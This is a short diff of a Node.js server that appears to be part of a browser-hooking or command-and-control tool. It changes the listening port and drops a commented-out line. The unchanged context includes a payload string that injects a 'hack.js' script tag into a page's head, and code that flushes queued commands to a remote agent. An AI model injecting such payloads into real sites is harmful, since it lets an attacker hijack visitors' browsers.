@@ -7,7 +7,7 @@ const finalhandler = require('finalhandler');
 const Agent = require('./Agent.js');
 
 const payload = '<script id="script1" type="text/javascript" src="hack.js"></script></head>';
-let port = 80;
+let port = 8080;
 let hostname = '127.0.0.1';
 let reset = "\x1b[0m", green = "\x1b[32m", red = "\x1b[31m", blue = "\x1b[34m", black = "\x1b[1m" + "\x1b[30m";
 let plus = (black + "[" + green + "+" + black +"]");
@@ -164,7 +164,6 @@ function cliForwardMSG(msg, res, req){
             console.log('Queue: ' + JSON.stringify(abc()));
         //make sure agent is here before sending
         console.log('flushed by cli')
-        //agent.sendWait();
         agent.flush();
         let date = new Date();
         let time = ('\n' + date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds())
